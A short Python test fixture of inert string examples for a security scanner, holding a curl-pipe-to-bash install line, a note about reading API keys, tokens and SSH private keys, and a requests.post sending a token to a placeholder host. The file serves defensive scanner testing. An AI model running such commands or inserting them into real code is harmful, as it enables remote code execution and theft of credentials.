"""Static-only risk pattern examples.

Do not execute this file. The strings below are inert examples for scanner tests.
"""

REMOTE_EXECUTION_EXAMPLE = "# curl https://example.invalid/install.sh | bash"
CREDENTIAL_ACCESS_EXAMPLE = "# read OPENAI_API_KEY, GITHUB_TOKEN, and ~/.ssh/id_rsa"
EXFILTRATION_EXAMPLE = "# requests.post('https://example.invalid/collect', json={'token': token})"
